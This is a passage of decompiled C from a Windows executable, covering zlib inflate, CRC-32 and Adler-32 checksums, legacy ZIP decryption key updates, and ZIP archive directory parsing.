            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
            param_6[1] = local_c + uVar12;
            pbVar1 = *param_6;
            *param_6 = local_8 + -uVar12;
            param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)s_invalid_literal_length_code_0041e3bc;
          goto LAB_004081f6;
        }
        iVar7 = (*(uint *)(&DAT_0041cbd8 + uVar14 * 4) & uVar15) + *(int *)(iVar13 + 4);
        bVar3 = *(byte *)(iVar13 + iVar7 * 8);
        uVar14 = (uint)bVar3;
        iVar13 = iVar13 + iVar7 * 8;
        bVar4 = *(byte *)(iVar13 + 1);
        uVar15 = uVar15 >> (bVar4 & 0x1f);
        if (uVar14 == 0) goto LAB_0040812c;
        uVar6 = uVar6 - *(byte *)(iVar13 + 1);
      }
      uVar14 = uVar14 & 0xf;
      uVar8 = (*(uint *)(&DAT_0041cbd8 + uVar14 * 4) & uVar15) + *(int *)(iVar13 + 4);
      uVar15 = uVar15 >> (sbyte)uVar14;
      for (uVar6 = uVar6 - uVar14; uVar6 < 0xf; uVar6 = uVar6 + 8) {
        bVar3 = *local_8;
        local_c = local_c + -1;
        local_8 = local_8 + 1;
        uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
      }
      pbVar1 = (byte *)(param_4 + (uVar5 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar1[1] & 0x1f);
      uVar6 = uVar6 - pbVar1[1];
      bVar3 = *pbVar1;
      while ((bVar3 & 0x10) == 0) {
        if ((bVar3 & 0x40) != 0) {
          param_6[6] = (byte *)s_invalid_distance_code_0041e3d8;
LAB_004081f6:
          uVar12 = (int)param_6[1] - (int)local_c;
          if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
            uVar12 = uVar6 >> 3;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
          param_6[1] = local_c + uVar12;
          pbVar1 = *param_6;
          *param_6 = local_8 + -uVar12;
          param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar13 = (*(uint *)(&DAT_0041cbd8 + (uint)bVar3 * 4) & uVar15) + *(int *)(pbVar1 + 4);
        pbVar2 = pbVar1 + iVar13 * 8 + 1;
        pbVar1 = pbVar1 + iVar13 * 8;
        uVar15 = uVar15 >> (*pbVar2 & 0x1f);
        uVar6 = uVar6 - *pbVar2;
        bVar3 = *pbVar1;
      }
      uVar14 = bVar3 & 0xf;
      for (; uVar6 < uVar14; uVar6 = uVar6 + 8) {
        bVar3 = *local_8;
        local_c = local_c + -1;
        local_8 = local_8 + 1;
        uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
      }
      uVar9 = *(uint *)(&DAT_0041cbd8 + uVar14 * 4) & uVar15;
      local_10 = local_10 + -uVar8;
      uVar15 = uVar15 >> (sbyte)uVar14;
      uVar6 = uVar6 - uVar14;
      puVar11 = *(undefined **)(param_5 + 0x28);
      puVar10 = puVar16 + -(uVar9 + *(int *)(pbVar1 + 4));
      if (puVar10 < puVar11) {
        do {
          puVar10 = puVar10 + (*(int *)(param_5 + 0x2c) - (int)puVar11);
        } while (puVar10 < puVar11);
        param_1 = *(int *)(param_5 + 0x2c) - (int)puVar10;
        if (param_1 < uVar8) {
          iVar13 = uVar8 - param_1;
          do {
            *puVar16 = *puVar10;
            puVar16 = puVar16 + 1;
            puVar10 = puVar10 + 1;
            param_1 = param_1 - 1;
          } while (param_1 != 0);
          puVar11 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar11;
            puVar16 = puVar16 + 1;
            puVar11 = puVar11 + 1;
            iVar13 = iVar13 + -1;
          } while (iVar13 != 0);
        }
        else {
          *puVar16 = *puVar10;
          puVar16[1] = puVar10[1];
          puVar16 = puVar16 + 2;
          puVar10 = puVar10 + 2;
          iVar13 = uVar8 - 2;
          do {
            *puVar16 = *puVar10;
            puVar16 = puVar16 + 1;
            puVar10 = puVar10 + 1;
            iVar13 = iVar13 + -1;
          } while (iVar13 != 0);
        }
      }
      else {
        *puVar16 = *puVar10;
        puVar16[1] = puVar10[1];
        puVar16 = puVar16 + 2;
        puVar10 = puVar10 + 2;
        iVar13 = uVar8 - 2;
        do {
          *puVar16 = *puVar10;
          puVar16 = puVar16 + 1;
          puVar10 = puVar10 + 1;
          iVar13 = iVar13 + -1;
        } while (iVar13 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_c < (byte *)0xa)) {
      uVar12 = (int)param_6[1] - (int)local_c;
      if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
        uVar12 = uVar6 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
      param_6[1] = local_c + uVar12;
      pbVar1 = *param_6;
      *param_6 = local_8 + -uVar12;
      param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_00408240(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 == (byte *)0x0) {
    return 0;
  }
  uVar1 = ~in_EAX;
  if (7 < param_2) {
    uVar2 = param_2 >> 3;
    do {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((*param_1 ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[1] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[2] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[3] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[4] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[5] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[6] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((param_1[7] ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 8;
      param_2 = param_2 - 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_2 != 0; param_2 = param_2 - 1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((*param_1 ^ uVar1) & 0xff) * 4);
    param_1 = param_1 + 1;
  }
  return ~uVar1;
}



void __fastcall FUN_00408340(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041df90 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_0041df90 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00408390(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_0041df90 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_0041df90 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_00408400(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_00408540(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



void __cdecl FUN_00408560(undefined4 param_1,void *param_2)

{
  _free(param_2);
  return;
}



undefined4 FUN_00408580(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408610(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_004077c0();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408660(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_00408540;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(code **)(in_EAX + 0x24) = FUN_00408560;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_00406cf0(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x408400);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (puVar2 != (undefined4 *)0x0) {
      FUN_00408580();
      return 0;
    }
    FUN_00408610();
  }
  return 0xfffffffc;
}



byte * FUN_00408710(void)

{
  byte bVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  byte **in_EAX;
  byte *pbVar4;
  
  if (((in_EAX != (byte **)0x0) && ((undefined4 *)in_EAX[7] != (undefined4 *)0x0)) &&
     (*in_EAX != (byte *)0x0)) {
    uVar2 = *(undefined4 *)in_EAX[7];
    pbVar4 = (byte *)0xfffffffb;
    do {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *(uint *)(in_EAX[7] + 4) = (uint)bVar1;
        *in_EAX = *in_EAX + 1;
        pbVar4 = (byte *)0x0;
        if ((bVar1 & 0xf) == 8) {
          puVar3 = (undefined4 *)in_EAX[7];
          if (((uint)puVar3[1] >> 4) + 8 <= (uint)puVar3[4]) {
            *puVar3 = 1;
            goto switchD_00408745_caseD_1;
          }
          *puVar3 = 0xd;
          in_EAX[6] = (byte *)s_invalid_window_size_0041e570;
          goto LAB_00408943;
        }
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)s_unknown_compression_method_0041e554;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 1:
switchD_00408745_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar3 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        pbVar4 = (byte *)0x0;
        if ((puVar3[1] * 0x100 + (uint)bVar1) % 0x1f != 0) {
          *puVar3 = 0xd;
          in_EAX[6] = (byte *)s_incorrect_header_check_0041e584;
          goto LAB_00408943;
        }
        if ((bVar1 & 0x20) == 0) {
          *puVar3 = 7;
          break;
        }
        *(undefined4 *)in_EAX[7] = 2;
      case 2:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        pbVar4 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
switchD_00408745_caseD_3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          pbVar4 = (byte *)0x0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_00408745_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            pbVar4 = (byte *)0x0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_00408745_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return (byte *)0x2;
            }
          }
        }
        return pbVar4;
      case 3:
        goto switchD_00408745_caseD_3;
      case 4:
        goto switchD_00408745_caseD_4;
      case 5:
        goto switchD_00408745_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)s_need_dictionary_0041c600;
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return (byte *)0xfffffffe;
      case 7:
        pbVar4 = (byte *)FUN_00406d90(*(void **)(in_EAX[7] + 0x14),pbVar4);
        if (pbVar4 == (byte *)0xfffffffd) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          pbVar4 = (byte *)0xfffffffd;
        }
        else {
          if (pbVar4 == (byte *)0x0) {
            return (byte *)0x0;
          }
          if (pbVar4 != (byte *)0x1) {
            return pbVar4;
          }
          pbVar4 = (byte *)0x0;
          FUN_00406c80();
          puVar3 = (undefined4 *)in_EAX[7];
          if (puVar3[3] == 0) {
            *puVar3 = 8;
            goto switchD_00408745_caseD_8;
          }
          *puVar3 = 0xc;
        }
        break;
      case 8:
switchD_00408745_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        pbVar4 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        pbVar4 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_00408745_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        pbVar4 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_00408745_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar4;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar3 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar3[1] == puVar3[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_00408745_caseD_c:
          return (byte *)0x1;
        }
        *puVar3 = 0xd;
        in_EAX[6] = (byte *)s_incorrect_data_check_0041e59c;
LAB_00408943:
        pbVar4 = (byte *)0x0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_00408745_caseD_a;
      case 0xb:
        goto switchD_00408745_caseD_b;
      case 0xc:
        goto switchD_00408745_caseD_c;
      case 0xd:
        return (byte *)0xfffffffd;
      default:
        goto switchD_00408745_caseD_e;
      }
      uVar2 = *(undefined4 *)in_EAX[7];
    } while( true );
  }
switchD_00408745_caseD_e:
  return (byte *)0xfffffffe;
}



uint __cdecl FUN_00408ab0(void *param_1,uint param_2)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint _Size;
  char *unaff_EDI;
  
  _Size = unaff_EBX * param_2;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 4),param_1,_Size,&param_2,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[8] = '\x01';
    }
    return param_2 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x1c);
  if (*(uint *)(unaff_EDI + 0x18) < iVar1 + _Size) {
    _Size = *(uint *)(unaff_EDI + 0x18) - iVar1;
  }
  FID_conflict__memcpy(param_1,(void *)(*(int *)(unaff_EDI + 0x14) + iVar1),_Size);
  *(uint *)(unaff_EDI + 0x1c) = *(int *)(unaff_EDI + 0x1c) + _Size;
  return _Size / unaff_EBX;
}



undefined4 __cdecl FUN_00408b20(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  size_t local_c;
  byte local_5;
  
  _Size = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + 1U) {
      _Size = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    FID_conflict__memcpy(&local_5,(void *)(*(int *)(unaff_ESI + 0x14) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x1c) = iVar1 + _Size;
    local_c = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 4),&local_5,1,&local_c,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  if (local_c == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[8] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_00408bb0(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_8;
  
  iVar2 = FUN_00408b20(&local_8);
  uVar1 = local_8;
  if (iVar2 == 0) {
    iVar2 = FUN_00408b20(&local_8);
  }
  iVar4 = local_8 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00408b20(&local_8);
  }
  iVar3 = local_8 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_00408b20(&local_8);
    if (iVar2 == 0) {
      *unaff_EBX = local_8 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_00408c30(void)

{
  int iVar1;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  BOOL BVar5;
  int iVar6;
  size_t _Size;
  uint uVar7;
  char *unaff_ESI;
  uint uVar8;
  uint local_1c;
  int local_18;
  void *local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x1c) = *(undefined4 *)(unaff_ESI + 0x18);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    local_8 = *(uint *)(unaff_ESI + 0x1c);
  }
  else if (unaff_ESI[1] == '\0') {
    local_8 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,1);
    local_8 = DVar2 - *(int *)(unaff_ESI + 0xc);
  }
  uVar7 = local_8;
  local_c = 0xffff;
  if (local_8 < 0xffff) {
    local_c = local_8;
  }
  uVar8 = local_c;
  local_14 = _malloc(0x404);
  if (local_14 == (void *)0x0) {
    return -1;
  }
  local_18 = -1;
  uVar3 = 4;
  if (uVar8 < 5) {
LAB_00408ddd:
    _free(local_14);
    return local_18;
  }
  do {
    local_10 = uVar8;
    if (uVar3 + 0x400 <= uVar8) {
      local_10 = uVar3 + 0x400;
    }
    iVar4 = uVar7 - local_10;
    uVar7 = uVar7 - iVar4;
    if (0x404 < uVar7) {
      uVar7 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x1c) = iVar4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_00408ddd;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 4),*(int *)(unaff_ESI + 0xc) + iVar4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar6 = *(int *)(unaff_ESI + 0x1c);
      _Size = uVar7;
      if (*(uint *)(unaff_ESI + 0x18) < iVar6 + uVar7) {
        _Size = *(uint *)(unaff_ESI + 0x18) - iVar6;
      }
      FID_conflict__memcpy(local_14,(void *)(*(int *)(unaff_ESI + 0x14) + iVar6),_Size);
      *(size_t *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + _Size;
    }
    else {
      BVar5 = ReadFile(*(HANDLE *)(unaff_ESI + 4),local_14,uVar7,&local_1c,(LPOVERLAPPED)0x0);
      _Size = local_1c;
      if (BVar5 == 0) {
        unaff_ESI[8] = '\x01';
      }
    }
    if (_Size / uVar7 != 1) goto LAB_00408ddd;
    iVar6 = uVar7 - 3;
    do {
      iVar1 = iVar6;
      if (iVar1 < 0) goto LAB_00408dcb;
      iVar6 = iVar1 + -1;
    } while ((((*(char *)(iVar6 + (int)local_14) != 'P') ||
              (*(char *)(iVar1 + (int)local_14) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)local_14) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)local_14) != '\x06'));
    local_18 = iVar6 + iVar4;
LAB_00408dcb:
    if ((local_18 != 0) || (uVar3 = local_10, uVar7 = local_8, uVar8 = local_c, local_c <= local_10)
       ) goto LAB_00408ddd;
  } while( true );
}



int * FUN_00408e00(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  int local_9c [7];
  int local_80;
  int local_7c;
  int local_78;
  undefined4 local_20;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  uint local_8;
  
  if (in_EAX != (char *)0x0) {
    local_c = 0;
    local_18 = FUN_00408c30();
    if (local_18 == -1) {
      local_c = -1;
    }
    if (*in_EAX == '\0') {
      *(int *)(in_EAX + 0x1c) = local_18;
    }
    else if (in_EAX[1] == '\0') {
      local_c = -1;
    }
    else {
      SetFilePointer(*(HANDLE *)(in_EAX + 4),*(int *)(in_EAX + 0xc) + local_18,(PLONG)0x0,0);
    }
    iVar2 = FUN_00408bb0();
    if (iVar2 != 0) {
      local_c = -1;
    }
    iVar2 = FUN_00408b20(&local_8);
    uVar1 = local_8;
    if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_8), iVar2 == 0)) {
      local_10 = local_8 * 0x100 + uVar1;
    }
    else {
      local_10 = 0;
      if (iVar2 != 0) {
        local_c = -1;
      }
    }
    iVar2 = FUN_00408b20(&local_8);
    uVar1 = local_8;
    if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_8), iVar2 == 0)) {
      local_14 = local_8 * 0x100 + uVar1;
    }
    else {
      local_14 = 0;
      if (iVar2 != 0) {
        local_c = -1;
      }
    }
    iVar2 = FUN_00408b20(&local_8);
    uVar1 = local_8;
    if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_8), iVar2 == 0)) {
      local_9c[1] = local_8 * 0x100 + uVar1;
    }
    else {
      local_9c[1] = 0;
      if (iVar2 != 0) {
        local_c = -1;
      }
    }
    iVar2 = local_9c[1];
    iVar3 = FUN_00408b20(&local_8);
    uVar1 = local_8;
    if ((iVar3 == 0) && (iVar3 = FUN_00408b20(&local_8), iVar3 == 0)) {
      iVar5 = local_8 * 0x100 + uVar1;
    }
    else {
      iVar5 = 0;
      if (iVar3 != 0) {
        local_c = -1;
      }
    }
    if (((iVar5 != iVar2) || (local_14 != 0)) || (local_10 != 0)) {
      local_c = -0x67;
    }
    iVar2 = FUN_00408bb0();
    if (iVar2 != 0) {
      local_c = -1;
    }
    iVar2 = FUN_00408bb0();
    if (iVar2 != 0) {
      local_c = -1;
    }
    iVar2 = FUN_00408b20(&local_8);
    uVar1 = local_8;
    if ((iVar2 == 0) && (iVar2 = FUN_00408b20(&local_8), iVar2 == 0)) {
      local_9c[2] = local_8 * 0x100 + uVar1;
    }
    else {
      local_9c[2] = 0;
      if (iVar2 != 0) {
        local_c = -1;
      }
    }
    if (((uint)(local_7c + local_78) <= (uint)(*(int *)(in_EAX + 0xc) + local_18)) && (local_c == 0)
       ) {
      local_9c[3] = ((*(int *)(in_EAX + 0xc) - local_7c) - local_78) + local_18;
      local_80 = local_18;
      local_20 = 0;
      *(undefined4 *)(in_EAX + 0xc) = 0;
      piVar4 = (int *)_malloc(0x80);
      piVar6 = local_9c;
      piVar7 = piVar4;
